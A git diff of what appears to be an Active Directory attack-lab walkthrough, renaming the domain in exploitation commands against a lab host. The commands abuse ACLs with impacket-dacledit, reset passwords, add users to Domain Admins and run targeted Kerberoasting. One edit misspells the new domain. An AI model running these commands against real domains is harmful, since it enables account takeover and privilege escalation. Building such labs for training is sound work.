@@ -431,7 +431,7 @@ impacket-dacledit -action 'write' -rights 'FullControl' -principal 'carla' -targ
 net rpc password rafaela 'Password@2026' -U redscan.local/carla%'Password' -S 192.168.56.200
 ```
 ```
-./targetedKerberoast.py --dc-ip '192.168.56.200' -v -d 'ignite.local' -u 'komal' -p 'Password@1'
+./targetedKerberoast.py --dc-ip '192.168.56.200' -v -d 'redscan.local' -u 'komal' -p 'Password@1'
 ```
 
 
@@ -444,7 +444,7 @@ Exploit
 impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'rudra' -target-dn 'CN=salesgroup,CN=Users,DC=ignite,DC=local' 'ignite.local'/'rudra':'Password@1' -dc-ip 192.168.56.200
 ```
 ```
-net rpc group addmem "Domain Admins" rudra -U ignite.local/rudra%'Password@1' -S 192.168.56.200
+net rpc group addmem "Domain Admins" rudra -U redsacn.local/rudra%'Password@1' -S 192.168.56.200
 ```
 
 
@@ -454,13 +454,13 @@ salesgroup - - > renato
 
 Exploit
 ```
-net rpc user -U ignite.local/renato%'Password@1' -S 192.168.56.200
+net rpc user -U redscan.local/renato%'Password@1' -S 192.168.56.200
 ```
 ```
-net rpc group members "salesgroup" -U ignite.local/renato%'Password@1' -S 192.168.56.200
+net rpc group members "salesgroup" -U redscan.local/renato%'Password@1' -S 192.168.56.200
 ```
 ```
-net rpc group addmem "salesgroup" "komal" -U ignite.local/renato%'Password@1' -S 192.168.56.200
+net rpc group addmem "salesgroup" "komal" -U redscan.local/renato%'Password@1' -S 192.168.56.200
 ```
 
 
@@ -470,13 +470,13 @@ neide - - > joao
 
 Exploit
 ```
-net rpc password joao 'Password1!' -U ignite.local/neide%'Password@1' -S 192.168.56.200
+net rpc password joao 'Password1!' -U redscan.local/neide%'Password@1' -S 192.168.56.200
 ```
 ```
 git clone https://github.com/ShutdownRepo/targetedKerberoast.git
 ```
 ```
-./targetedKerberoast.py --dc-ip '192.168.56.200' -v -d 'ignite.local' -u 'neide' -p 'Password@1'
+./targetedKerberoast.py --dc-ip '192.168.56.200' -v -d 'redscan.local' -u 'neide' -p 'Password@1'
 ```
 
 
@@ -486,7 +486,7 @@ tigroup - - > paty
 
 Exploit
 ```
-net rpc group addmem "tigroup" paty -U ignite.local/paty%'Password@1' -S 192.168.56.200
+net rpc group addmem "tigroup" paty -U redscan.local/paty%'Password@1' -S 192.168.56.200
 ```
 
 ### VULN 10 - GenericWrite: Group
@@ -498,7 +498,7 @@ Exploit
 git clone https://github.com/ShutdownRepo/targetedKerberoast.git
 ```
 ```
-./targetedKerberoast.py --dc-ip '192.168.56.200' -v -d 'ignite.local' -u 'radha' -p 'Password@1'
+./targetedKerberoast.py --dc-ip '192.168.56.200' -v -d 'redscan.local' -u 'radha' -p 'Password@1'
 ```
 
 
